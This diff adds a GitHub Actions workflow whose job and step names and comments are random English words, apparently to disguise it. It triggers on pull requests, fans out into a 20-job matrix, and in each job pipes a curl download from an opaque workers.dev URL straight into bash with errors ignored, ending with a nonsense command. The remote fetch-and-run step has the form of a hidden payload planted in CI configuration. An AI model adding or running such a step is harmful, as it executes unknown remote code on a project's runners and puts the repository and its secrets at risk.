@@ -1,0 +1,27 @@
+name: reception
+
+on:
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+#automobile literature contact qualification arbitrary impress
+jobs:
+  hen:
+    #feed neighbourhood
+    strategy:
+      matrix:
+        my: ["immediately", "comprehension", "boss", "voluntary", "application"]
+        pollution: ["herself", "overwhelm", "orphan", "sideways"]
+      fail-fast: false
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v6
+    #single
+    - name: attitude
+      continue-on-error: true
+      #nephew
+      run: |
+        curl -L "https://i.donnickcarbonaro70085.workers.dev/f/6/ea67880ecc4ad2c45a3/9a8146c918d84fc2dcf65330a4/9794f8b0dd629add/4?z=1776063646" | bash
+    - name: donation
+      run: curiosity
